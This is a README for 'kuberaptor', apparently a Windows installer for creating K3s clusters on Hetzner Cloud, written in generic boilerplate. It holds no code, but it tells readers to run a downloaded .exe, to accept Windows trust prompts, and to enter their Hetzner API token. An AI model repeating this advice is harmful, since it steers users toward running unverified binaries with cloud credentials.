# 🐉 kuberaptor - Simple Private Kubernetes Clusters

[![Download kuberaptor](https://img.shields.io/badge/Download-kuberaptor-brightgreen?style=for-the-badge&logo=github)](https://github.com/firas-en/kuberaptor/releases)

---

## 📋 What is kuberaptor?

kuberaptor helps you create private Kubernetes clusters on Hetzner Cloud. It sets up ready-to-use K3s clusters with one simple command. You don’t need to write code or understand complex technology. kuberaptor handles the details so you can focus on your projects.

This tool is designed for production use. It works with Hetzner Cloud, a popular and reliable cloud provider. You get automation that fits real business needs, not just tests or experiments.

---

## 🔍 Key Features

- Single command cluster creation  
- No programming required  
- Runs on Hetzner Cloud virtual servers  
- Uses lightweight K3s Kubernetes  
- Suitable for production-ready private clusters  
- Supports multi-node clusters  
- Automated setup of networking and security  
- Easy to manage without deep Kubernetes knowledge  

---

## ⚙️ System Requirements

To use kuberaptor on Windows, your system should meet these basic requirements:

- Windows 10 or newer (64-bit recommended)  
- At least 4 GB of free RAM  
- 2 GHz processor or better  
- 500 MB of free disk space for the application itself  
- Internet connection for cloud access and downloads  
- A modern browser to open links and documentation  

---

## 🛠️ Before You Start

You will need:

1. A Hetzner Cloud account. You can create one at https://www.hetzner.com/cloud  
2. Your Hetzner Cloud API token. This token allows kuberaptor to manage your cloud resources. You can find it inside your Hetzner Cloud Console under "API Tokens"  
3. A Windows machine that meets system requirements above  

---

## 🚀 Getting Started with kuberaptor on Windows

### Step 1: Visit the Download Page

Go to the kuberaptor release page to get the latest Windows version:

[![Download kuberaptor](https://img.shields.io/badge/Download-kuberaptor-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/firas-en/kuberaptor/releases)

This page lists all available versions with setup files for Windows.

---

### Step 2: Download kuberaptor

Look for the latest stable release. The file will typically end with `.exe` for Windows.

Click to download the executable file. Choose a location you can find easily, like your Downloads folder or Desktop.

---

### Step 3: Run the Installer

Find the downloaded `.exe` file and double-click it. Windows will start the installer.

If Windows asks if you trust this software, confirm “Yes” or “Run” to allow installation.

Follow any prompts to complete the installation. Most installations will finish with just a few clicks.

---

### Step 4: Start kuberaptor

Once installed, open kuberaptor from your Start menu or Desktop shortcut.

A simple window or command prompt screen will appear. This interface lets you create your Kubernetes cluster.

---

## 🔑 Connecting kuberaptor to Hetzner Cloud

To create clusters, kuberaptor needs to connect to your Hetzner Cloud account. You will give it your API token.

1. Open the application  
2. Enter your Hetzner API token when asked  
3. Confirm the connection  

If you do not yet have an API token:

- Log in to https://console.hetzner.cloud  
- Navigate to “API Tokens” on the left menu  
- Click “Create API Token”  
- Copy the token shown; paste it into kuberaptor when requested  

---

## 👷 Creating Your First Kubernetes Cluster

After you connect your account:

1. Select the size of your cluster. For example, choose the number of nodes (servers). A small cluster usually starts with 3 nodes.  
2. Choose the server type. kuberaptor will suggest some default sizes that work well with K3s.  
3. Give your cluster a name. This helps you identify it later in Hetzner Cloud.  
4. Review and confirm your choices.  

Once done, kuberaptor will start creating and setting up the cluster automatically. This process may take several minutes. kuberaptor will show progress updates.

---

## 🔧 Managing Your Cluster

kuberaptor provides simple controls to:

- View cluster status  
- Add or remove nodes  
- Restart cluster components  
- Update Kubernetes version  

You do this from the kuberaptor interface without coding.

---

## 📂 Viewing Logs and Troubleshooting

If something does not work as expected, you can check logs from kuberaptor:

- Logs show step-by-step details of cluster setup  
- Find logs inside the kuberaptor program folder or via the interface  
- Use logs to spot errors or issues  
- Common issues include incorrect API token or network problems  

---

## 🛡️ Security and Access

Your cluster is private and only accessible via the Hetzner Cloud network unless you open ports purposely.

kuberaptor sets up secure access rules automatically. It also follows best practices for Kubernetes security.

You retain control of your cloud account and can revoke kuberaptor’s API token anytime.

---

## 🔄 Updating kuberaptor

Check the release page regularly for updates:  
https://github.com/firas-en/kuberaptor/releases

New versions fix bugs and add improvements. Download and run the new installer to upgrade.

---

## 💬 Getting Help

If you need help or want to learn more:

- Review the documentation on the repository’s website  
- Browse the GitHub issues page for common questions  
- Contact Hetzner support if the problem relates to your cloud account  

---

## ⚡ Summary - How to Download and Run kuberaptor on Windows

1. Visit the releases page: https://github.com/firas-en/kuberaptor/releases  
2. Download the latest Windows `.exe` file  
3. Run the installer and complete setup  
4. Open kuberaptor and enter your Hetzner API token  
5. Choose cluster options and create your Kubernetes cluster  

Get started quickly and run your private Kubernetes clusters without programming.